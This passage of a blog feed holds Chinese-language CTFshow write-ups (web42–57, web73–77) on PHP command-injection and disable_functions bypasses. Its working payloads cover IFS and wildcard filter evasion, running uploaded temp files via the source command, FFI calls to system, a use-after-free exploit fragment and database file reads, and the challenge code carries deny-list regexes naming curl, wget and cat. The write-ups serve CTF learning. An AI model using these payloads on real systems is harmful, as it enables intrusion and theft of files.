write($abc, 0xd0 + 0x68, $zif_system);     ($helper-&gt;b)($cmd);    exit();&#125;ctfshow(&quot;cat &#x2F;flagc.txt&quot;);ob_end_flush();?&gt;</code></pre><p>但是访问之后会502，看了视频发现也是502</p><h1 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h1><p>先扫目录文件</p><pre class="language-php" data-language="php"><code class="language-php">c&#x3D;?&gt;&lt;?php $a&#x3D;new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125;exit(0);?&gt;</code></pre><p>文件被修改为flagx.txt，直接像上一道题一样include文件包含就行。</p><h1 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h1><p>先看文件目录：</p><pre class="language-php" data-language="php"><code class="language-php">c&#x3D;$a&#x3D;new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125;exit();</code></pre><p>抽象，看了视频说直接使用数据库。</p><pre class="language-php" data-language="php"><code class="language-php">c&#x3D;try &#123;$dbh &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;ctftraining&#39;, &#39;root&#39;,&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;&#x2F;flag36.txt&quot;)&#39;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh &#x3D; null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);</code></pre><p>但是他并没有提这个数据库名称是怎么来的。<br>我们可以通过通用的数据库来获取到数据库的名称：</p><pre class="language-php" data-language="php"><code class="language-php">$dsn &#x3D; &quot;mysql:host&#x3D;localhost;dbname&#x3D;information_schema&quot;;$db &#x3D; new PDO($dsn, &#39;root&#39;, &#39;root&#39;);$rs &#x3D; $db-&gt;query(&quot;select group_concat(SCHEMA_NAME) from SCHEMATA&quot;);foreach($rs as $row)&#123;        echo($row[0]).&quot;|&quot;; &#125;exit();</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681290428024-3c729f7a-edc5-4787-a8df-5f0a30f7a678.png" alt="image.png"><br>然后在使用他提供的payload就可以了。</p><h1 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h1><p>文件名修改为了flag36d.txt<br>直接用上一道题的payload获取flag即可。</p><h1 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h1><blockquote><p><a href="https://blog.csdn.net/weixin_44700621/article/details/125381763">https://blog.csdn.net/weixin_44700621&#x2F;article&#x2F;details&#x2F;125381763</a> 这个写的挺全的</p></blockquote><p>还是先看文件名，发现有两个可疑文件：flag36x.tx t和 readflag<br>题里面提示了是php7.4。payload使用的是PHP 7.4+的FFI特性，即外部函数接口特性</p><pre class="language-php" data-language="php"><code class="language-php">$ffi &#x3D; FFI::cdef(&quot;int system(const char *command);&quot;);&#x2F;&#x2F;创建一个system对象$a&#x3D;&#39;&#x2F;readflag &gt; 1.txt&#39;;&#x2F;&#x2F;没有回显的$ffi-&gt;system($a);&#x2F;&#x2F;通过$ffi去调用system函数</code></pre><p>由于没有回显，所以这里要把结果写到1.txt里面。<br>PHP手册中对<code>FFI:cdef</code>原型的描述为<code>public static FFI::cdef(string $code = &quot;&quot;, ?string $lib = null)</code>，其中$code为一个字符串，包含常规C语言中的一系列声明，$lib为要加载和链接的共享库文件名称，如果省略lib，则平台将会尝试在全局范围内查找代码中声明的符号，其他系统将无法解析这些符号。<br><code>int system(const char *command);</code>即为C语言中system函数的定义，用于执行系统命令，也即在Linux平台下将&#x2F;readflag &gt; 1.txt使用shell进行解析并执行，因此猜测readflag可能是一个可执行文件。<br>因此也可以用这种方法读取根目录下的文件：</p><pre class="language-php" data-language="php"><code class="language-php">c&#x3D;$ffi &#x3D; FFI::cdef(&quot;int system(const char *command);&quot;);$a&#x3D;&#39;ls &#x2F; &gt; 1.txt&#39;;$ffi-&gt;system($a);exit();</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681291412242-bd33651d-8eaf-4013-bf26-6ab8ad987bfd.png" alt="image.png"><br>最后的获取flag的payload如下：</p><pre class="language-php" data-language="php"><code class="language-php">c&#x3D;$ffi &#x3D; FFI::cdef(&quot;int system(const char *command);&quot;);$a&#x3D;&#39;&#x2F;readflag &gt; 1.txt&#39;;$ffi-&gt;system($a);exit();</code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>后面几道题做起来真是抽象中的抽象，但是也给了我很多视角，感觉挺耳目一新的就是那个73里面对uaf的方法重写的想法挺新奇的，之前没有想过。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web42-57命令执行篇（二）</title>
      <link href="/posts/979871d9/"/>
      <url>/posts/979871d9/</url>
      
        <content type="html"><![CDATA[<h1 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h1><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;c&#39;]))&#123;  $c&#x3D;$_GET[&#39;c&#39;];  system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);&#125;else&#123;  highlight_file(__FILE__);&#125;</code></pre><p>在变量后面拼接了一堆字符串。在此之前，我们需要先思考这一串是什么东西。</p><pre class="language-python" data-language="python"><code class="language-python">&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 </code></pre><p>就是让标准输出重定向到&#x2F;dev&#x2F;null中（丢弃标准输出），然后错误输出由于重用了标准输出的描述符，所以错误输出也被定向到了&#x2F;dev&#x2F;null中，错误输出同样也被丢弃了。执行了这条命令之后，该条shell命令将不会输出任何信息到控制台，也不会有任何信息输出到文件中。<br>因此这个也被成为数据黑洞（还是很形象的）。<br>这部分的bypass是双写，让后面的指令结果进入黑洞，但是保全前面的命令。<br>比如说：<code>?c=ls;ls</code>，这就出现了运行结果。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678888044280-4977aed2-5019-4f9a-b9f3-7a5f88a08b5d.png" alt="image.png"><br>于是payload也就很容易得到了：<code>?c=tac flag.php;ls</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678888113737-36ea4c05-f999-4289-b19f-55a8710fc053.png" alt="image.png"></p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>当然直接使用<code>%0a</code>截断也可以，比如：<code>tac f*%0a</code></p><h2 id="从重定向到黑洞（-dev-null-2-1）"><a href="#从重定向到黑洞（-dev-null-2-1）" class="headerlink" title="从重定向到黑洞（&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1）"></a>从重定向到黑洞（&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1）</h2><blockquote><p><a href="https://www.cnblogs.com/kexianting/p/11630085.html">https://www.cnblogs.com/kexianting/p/11630085.html</a>（建议忘了看这个，写的很全）</p></blockquote><p>但是我们不能只知道这个东西是是黑洞，我们也要明白其中的原理。<br>容易看出，上面的语句应该是分成两段，前一段是：<code>&gt;/dev/null</code>后一段是：<code>2&gt;&amp;1</code><br>前者的含义是将输出结果定向到<code>&gt;/dev/null</code>，而这个地址表示的是linux的空设备，因此会将运行结果消灭。<br>而后者简单解释就是将正确和错误两个输出绑定到一起，都输出到同一个地方。（其中1指的是标准输出，2指的是错误输出，详细的看参考文章）。</p><h1 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h1><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;c&#39;]))&#123;  $c&#x3D;$_GET[&#39;c&#39;];  if(!preg_match(&quot;&#x2F;\;|cat&#x2F;i&quot;, $c))&#123;    system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);  &#125;&#125;else&#123;  highlight_file(__FILE__);&#125;</code></pre><p>过滤了分号，不能用上一题的方法绕过了，但是可以使用<code>%0a</code>（回车）截断。<br>payload：<code>tac f*%0a</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679064061206-b7272e00-d5ee-46c4-bb3f-60feec9e1b6b.png" alt="image.png"></p><h1 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h1><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;c&#39;]))&#123;  $c&#x3D;$_GET[&#39;c&#39;];  if(!preg_match(&quot;&#x2F;;|cat|flag&#x2F;i&quot;, $c))&#123;    system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);  &#125;&#125;else&#123;  highlight_file(__FILE__);&#125;</code></pre><p><code>?c=tac f*%0a</code></p><h1 id="web45-IFS绕过原理解析"><a href="#web45-IFS绕过原理解析" class="headerlink" title="web45 IFS绕过原理解析"></a>web45 IFS绕过原理解析</h1><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;\;|cat|flag| &#x2F;i&quot;, $c))&#123;        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>多了一个空格过滤，payload中简单加一个<code>$&#123;IFS&#125;</code>即可绕过。<br><code>?c=tac$&#123;IFS&#125;f*%0a</code></p><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><blockquote><p><a href="https://blog.csdn.net/qq_54727981/article/details/125936528">https://blog.csdn.net/qq_54727981&#x2F;article&#x2F;details&#x2F;125936528</a></p></blockquote><p>一直使用IFS来绕过，但是一直不知道什么意思，了解了一下：<br><em>$IFS 是一种 set 变量，当 shell 处理”命令替换”和”参数替换”时，shell 根据 IFS 的值，默认是 space,tab, newline 即空格，制表符，空行来拆解读入的变量，然后对特殊字符进行处理，最后重新组合赋值给该变量。<br>直接用$IFS的话，会认为解析没结束，会把后面的也当做参数解析，比如cat$IFSflag.php，会把IFSflag一起当变量解析。这时候需要在$IFS后面进行截断，使解析为空，结束 $IFS，正常执行后面的内容。</em></p><pre class="language-php" data-language="php"><code class="language-php">cat$IFS$1flag.php&#x2F;&#x2F;使用特殊变量cat$&#123;IFS&#125;flag.php&#x2F;&#x2F;使用&#123;&#125;cat$IFS&#39;f&#39;lag.php&#x2F;&#x2F;使用引号cat$IFS\flag.php&#x2F;&#x2F;使用转义符cat$IFS?lag.php&#x2F;&#x2F;使用通配符</code></pre><h1 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h1><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\\$|\*&#x2F;i&quot;, $c))&#123;        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>空格过滤还过滤了美元符号，用通配符<code>&lt;</code>绕过即可。flag和*过滤用单双引号绕过即可。<br><code>?c=tac&lt;&gt;&#39;f&#39;lag.php%0a</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679066076057-af02fc4a-8fcb-4ffd-92d2-a0a618e12b51.png" alt="image.png"></p><h1 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h1><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail&#x2F;i&quot;, $c))&#123;        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p><code>?c=tac&lt;&#39;f&#39;lag.php%0a</code><br>hint中给的方法是这种：<code>nl&lt;fla&#39;&#39;g.php||</code><br>看来管道符也可以截断，但是尝试将管道符换成&amp;却不行。可能这里截断的是文本而不是命令。</p><h1 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h1><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\&#96;&#x2F;i&quot;, $c))&#123;        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>竟然还没有过滤tac<br><code>?c=tac&lt;&#39;f&#39;lag.php%0a</code></p><h1 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h1><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\&#96;|\%&#x2F;i&quot;, $c))&#123;        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p><code>?c=tac&lt;f&#39;&#39;lag.php||</code>不让用%0a，就用刚刚在hint中学到的双管道符隔断。</p><h1 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h1><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\&#96;|\%|\x09|\x26&#x2F;i&quot;, $c))&#123;        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p><code>?c=tac&lt;f&#39;&#39;lag.php||</code><br>过滤中出现了很有意思的东西：<code>\x09 和\x26</code>，\x表示后面两位用十六进制来表示，则前面两国的代表ascii码为9和26的字符<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679067645206-6016ee60-ecf7-444c-b21f-8aa772e86e2d.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679067671699-e7dac3c6-fcc4-4c21-abc4-ec77d4cec155.png" alt="image.png"><br>注意是十六进制，不是十进制。</p><h1 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h1><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\&#96;|\%|\x09|\x26&#x2F;i&quot;, $c))&#123;        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>这回把tac过滤了，但是还是有能用的，比如说nl<br><code>?c=nl&lt;&#39;f&#39;lag.php||</code>，php代码需要打开f12查看。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679068035543-96675332-0e1e-4049-a48b-92fc65af02f3.png" alt="image.png"></p><h1 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h1><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>把通配符的&lt;&gt;过滤了，找了半天还有什么办法能够绕过空额过滤，看hint才发现又可以使用$了…<br><code>?c=nl$&#123;IFS&#125;fla&#39;&#39;g.php||</code></p><h1 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h1><pre class="language-c" data-language="c"><code class="language-c">if(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;        echo($c);        $d &#x3D; system($c);        echo &quot;&lt;br&gt;&quot;.$d;    &#125;else&#123;        echo &#39;no&#39;;    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p><code>?c=nl$&#123;IFS&#125;fla&#39;&#39;g.php</code>但实际上前面过滤的字符也可以通过单引号引用绕过过滤，比如hint中的payload如下：<code>c&#39;&#39;at$&#123;IFS&#125;fla&#39;&#39;g.p&#39;&#39;hp</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679585398882-ec3be4e8-ae77-465f-a040-def087976b2b.png" alt="image.png"></p><h1 id="web54-通配符中问号的使用"><a href="#web54-通配符中问号的使用" class="headerlink" title="web54 通配符中问号的使用"></a>web54 通配符中问号的使用</h1><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;        system($c);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>第一种方法：<code>mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;a.txt</code>，因为没有禁用ls，因此知道文件名，因此可以使用mv来重命名文件。然后打开即可，打开有几种不同的方法，比如说<code>?c=uniq$&#123;IFS&#125;a.txt</code>，但是flag在源代码中，需要f12查看；或者用<code>?c=rev$&#123;IFS&#125;a.txt</code>反转输出文件，这种得到的flag是行反转的，需要调转回来：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679587103373-ae7c080f-73d5-4fb5-b617-0b10124e9840.png" alt="image.png"><br>除此之外，还有一种直接一步完成的方法。<code>c=uniq$&#123;IFS&#125;f???.php</code>，这里通过使用？通配符来一步绕过过滤，其实对名称的过滤大部分就是对linux通配符的考察，需要我们一点点加强功底。</p><h2 id="通配符？和-的区别"><a href="#通配符？和-的区别" class="headerlink" title="通配符？和*的区别"></a>通配符？和*的区别</h2><p>*可以替代一个或多个字符，而？只能替代一个字符。<br>比如：</p><ul><li>如果正在查找以AEW开头的一个文件，但不记得文件名其余部分，可以输入AEW*，查找以AEW开头的所有文件类型的文件，如AEWT.txt、AEWU.EXE、AEWI.dll等。</li><li>如果输入love?，查找以love开头的一个字符结尾文件类型的文件，如lovey、lovei等。要缩小范围可以输入love?.doc，查找以love开头的一个字符结尾文件类型并.doc为扩展名的文件如lovey.doc、loveh.doc。</li></ul><h1 id="web55-通配符中问号使用plus版"><a href="#web55-通配符中问号使用plus版" class="headerlink" title="web55 通配符中问号使用plus版"></a>web55 通配符中问号使用plus版</h1><blockquote><p><a href="https://blog.csdn.net/xiaolong22333/article/details/109480420?spm=a2c6h.12873639.article-detail.4.6ced5331lGc8cc">https://blog.csdn.net/xiaolong22333/article/details/109480420?spm=a2c6h.12873639.article-detail.4.6ced5331lGc8cc</a></p></blockquote><pre class="language-php" data-language="php"><code class="language-php">&#x2F;&#x2F; 你们在炫技吗？if(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;\;|[a-z]|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;        system($c);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>刚看到这个题的第一想法是使用自增，但是发现吧分号过滤了，用不了。看了一下wp，发现了几种比较牛逼的解法。</p><h2 id="方法一-使用bin目录下的base64命令-来代替字符"><a href="#方法一-使用bin目录下的base64命令-来代替字符" class="headerlink" title="方法一 使用bin目录下的base64命令 ?来代替字符"></a>方法一 使用bin目录下的base64命令 ?来代替字符</h2><p>这里想使用的知识点是：<code>/bin/base64 flag.php</code><br>先介绍一下，在&#x2F;bin目录下有若干个命令可以使用：</p><pre class="language-php" data-language="php"><code class="language-php">cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等</code></pre><p>但是这里过滤了字符，不能直接用，因此我们可以借助通配符中的问号来完成payload。<br>即<code>/???/????64</code>因为没有过滤掉数字，所以可以通过64来找到base64命令。当然，文件名也是可以使用？表示的。<br>payload：<code>/???/????64 ????.???</code>后面这串代表的<code>flag.php</code>。将得到的字符串base64解密即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679811886497-dc470501-ef71-466c-b5cf-70e724650d0a.png" alt="image.png"><br>但是如何知道文件名是<code>flag.php</code>的这里并没有提到。</p><h2 id="方法二-使用bzip2下载文件-？来代替字符"><a href="#方法二-使用bzip2下载文件-？来代替字符" class="headerlink" title="方法二 使用bzip2下载文件 ？来代替字符"></a>方法二 使用bzip2下载文件 ？来代替字符</h2><p>除了<code>/bin</code>地址下，<code>/usr/bin</code>下也有执行命令。</p><pre class="language-php" data-language="php"><code class="language-php">c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb、wget等</code></pre><p>因此，我们也可以像方法一中选择具有数字的方法来使用，比如：<br><code>/usr/bin/bzip2 flag.php</code><br>修改为payload：<code>/???/???/????2 ????.???</code>，压缩之后，查询发现bzip2方法压缩的文件名称后缀为<code>.bz2</code><br>因此我们访问文件下载即可<code>/flag.php.bz2</code>，在本地解压打开即可：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679813512843-4296f544-86a6-4c74-a04e-ebd399b198ef.png" alt="image.png"></p><h2 id="方法三-“-”的妙用"><a href="#方法三-“-”的妙用" class="headerlink" title="方法三 “.”的妙用"></a>方法三 “.”的妙用</h2><blockquote><p><a href="https://blog.sina.com.cn/s/blog_af68a2c201016nh2.html">https://blog.sina.com.cn/s/blog_af68a2c201016nh2.html</a></p></blockquote><p>source命令，也就是.命令，可以通过<code>. file</code>来执行命令，因此这题我们可以通过post上传文件来执行命令。<br>当我们上传文件之后，文件会被保存在<code>/tmp</code>下，文件名称为随机构成的六个字符。因此可以使用<code>/???/??????</code>来匹配文件，但是临时文件有很多，这样没有办法精准地找到需要的文件。<br>这篇文章给出了解决方案：</p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p></blockquote><p>在tmp临时文件中，只有php生成的文件是包含大写字母的，其余都是小写字母，因此我们可以加一个过滤大写字母的正则表达式，但是由于不一定一定会生成大写字母，因此需要多次尝试。<br>过滤出大写字母正常来说应该按照如下来写：<code>/???/????????[A-Z]</code>，但是这题里面过滤掉了字符，因此只能用A前面的字符和Z后面的字符（ASCII表），也就是：<code>/???/????????[@-[]</code>。<br>我们应该如何上传文件呢。<br>比较复杂的办法就是自己构造post内容写，比较简单的就是借助工具。<br>在本地写一个简单的html文件（将地址修改为目标地址）</p><pre class="language-markup" data-language="markup"><code class="language-markup">&lt;!DOCTYPE html&gt;&lt;html lang&#x3D;&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;    &lt;title&gt;POST数据包POC&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;d3b49897-da81-47f9-8495-e017b7cf25e7.challenge.ctf.show&#x2F;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;&lt;!--链接是当前打开的题目链接--&gt;    &lt;label for&#x3D;&quot;file&quot;&gt;文件名：&lt;&#x2F;label&gt;    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt;    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>本地运行文件，然后上传即可。<br>修改上传文件内容：</p><pre class="language-markup" data-language="markup"><code class="language-markup">#!&#x2F;bin&#x2F;shcat flag.php</code></pre><p>注意途中要抓包，这样才更方便修改。<br>修改get传参<code>/?c=. /???/????????[@-[]</code>，我们可以先修改文件内容来ls一下查看文件：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679817166939-6c78d5c4-63c2-4473-9416-6b24f0bff2bc.png" alt="image.png"><br>cat访问文件。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679817244688-04f1315d-5f3a-4305-a1fc-68a7850e8dc0.png" alt="image.png"><br>注意，有的时候没有回显是因为文件末尾并不是大写字母，需要多尝试两遍。</p><h1 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h1><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;c&#39;]))&#123;  $c&#x3D;$_GET[&#39;c&#39;];  if(!preg_match(&quot;&#x2F;\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#39;|\&quot;|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;    system($c);  &#125;&#125;else&#123;  highlight_file(__FILE__);&#125;</code></pre><p>同理，使用上一题第三种方法上传文件即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680162642108-4d1c4acd-baaa-40e9-9e8d-669a726c41d8.png" alt="image.png"></p><h1 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h1><blockquote><p><a href="https://blog.csdn.net/qq_46091464/article/details/108563368">https://blog.csdn.net/qq_46091464&#x2F;article&#x2F;details&#x2F;108563368</a><br><a href="https://blog.csdn.net/weixin_45551083/article/details/110096787">https://blog.csdn.net/weixin_45551083&#x2F;article&#x2F;details&#x2F;110096787</a></p></blockquote><pre class="language-php" data-language="php"><code class="language-php">&#x2F;&#x2F; 还能炫的动吗？&#x2F;&#x2F;flag in 36.phpif(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;\;|[a-z]|[0-9]|\&#96;|\|\#|\&#39;|\&quot;|\&#96;|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\&#x3D;|\[&#x2F;i&quot;, $c))&#123;        system(&quot;cat &quot;.$c.&quot;.php&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>跑一下剩余字符：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680166455656-158b002d-4a51-46d1-a26e-4f05df0a938a.png" alt="image.png"><br>题目的意思就是让我们使用剩余的这些字符凑出一个36出来。我们先看一下payload是什么：</p><pre class="language-php" data-language="php"><code class="language-php">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</code></pre><p>我们在linux中尝试一下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680166804307-4e25e785-2fda-487e-9e77-1a53dc2711aa.png" alt="image.png"><br>为什么会这样呢？我们分析一下，我们先要知道这其中的几个基础结构：</p><pre class="language-php" data-language="php"><code class="language-php">$&#123;_&#125;:代表上一次命令执行的结果$(()): 做运算</code></pre><p>知道了基础，然后我们结合数据。</p><pre class="language-php" data-language="php"><code class="language-php">$(($&#123;_&#125;))&#x3D;0$((~$(($&#123;_&#125;))))&#x3D;-1</code></pre><p>然后直接使用脚本跑就行，需要36，那么就传入37然后再减一就行。</p><pre class="language-python" data-language="python"><code class="language-python">data &#x3D; &quot;$((~$((&quot;+&quot;$((~$(())))&quot;*37+&quot;))))&quot;print(data)</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
